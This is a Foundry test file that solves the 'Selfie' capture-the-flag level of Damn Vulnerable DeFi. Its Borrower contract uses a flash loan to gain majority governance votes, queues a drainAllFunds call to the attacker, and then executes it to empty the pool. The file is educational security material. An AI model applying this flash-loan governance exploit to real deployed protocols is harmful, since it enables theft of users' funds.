// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableTokenSnapshot.sol";
import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";

contract Borrower {
    SimpleGovernance internal simpleGovernance;
    SelfiePool internal selfiePool;
    address internal attacker;
    uint256 actionId;

    constructor(SimpleGovernance _simpleGovernance, SelfiePool _selfiePool) {
        attacker = msg.sender;
        simpleGovernance = _simpleGovernance;
        selfiePool = _selfiePool;
    }

    function receiveTokens(address _addr, uint256 _amount) public {
        // to get away with 'ERC20Snapshot: id is 0'
        DamnValuableTokenSnapshot(_addr).snapshot();
        // queue the action selfiePool.drainAllFunds(attacker)
        // so the governance can execute it
        bytes memory data = abi.encodeWithSelector(SelfiePool.drainAllFunds.selector, attacker);
        // save the id so we can execute the action after
        // the time warp
        actionId = simpleGovernance.queueAction(address(selfiePool), data, 0);
        // return the loan
        DamnValuableTokenSnapshot(_addr).transfer(address(selfiePool), _amount);
    }

    function preparation(uint256 _amount) external {
        selfiePool.flashLoan(_amount);
    }

    function attack() external {
        simpleGovernance.executeAction(actionId);
    }
}

contract Selfie is Test {
    uint256 internal constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 internal constant TOKENS_IN_POOL = 1_500_000e18;

    Utilities internal utils;
    SimpleGovernance internal simpleGovernance;
    SelfiePool internal selfiePool;
    DamnValuableTokenSnapshot internal dvtSnapshot;
    address payable internal attacker;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];

        vm.label(attacker, "Attacker");

        dvtSnapshot = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);
        vm.label(address(dvtSnapshot), "DVT");

        simpleGovernance = new SimpleGovernance(address(dvtSnapshot));
        vm.label(address(simpleGovernance), "Simple Governance");

        selfiePool = new SelfiePool(
            address(dvtSnapshot),
            address(simpleGovernance)
        );

        dvtSnapshot.transfer(address(selfiePool), TOKENS_IN_POOL);

        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), TOKENS_IN_POOL);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        vm.startPrank(attacker);
        Borrower borrower = new Borrower(
            simpleGovernance,selfiePool
        );
        // just loan enough of it to gain the govn xD
        borrower.preparation(TOKEN_INITIAL_SUPPLY / 2 + 1);
        // without + 1 it reverts with NotEnoughVotesToPropose(), yeah :p
        vm.warp(simpleGovernance.getActionDelay() + 1);
        // execute the proposal
        borrower.attack();
        vm.stopPrank();
        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        // Attacker has taken all tokens from the pool
        assertEq(dvtSnapshot.balanceOf(attacker), TOKENS_IN_POOL);
        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), 0);
    }
}
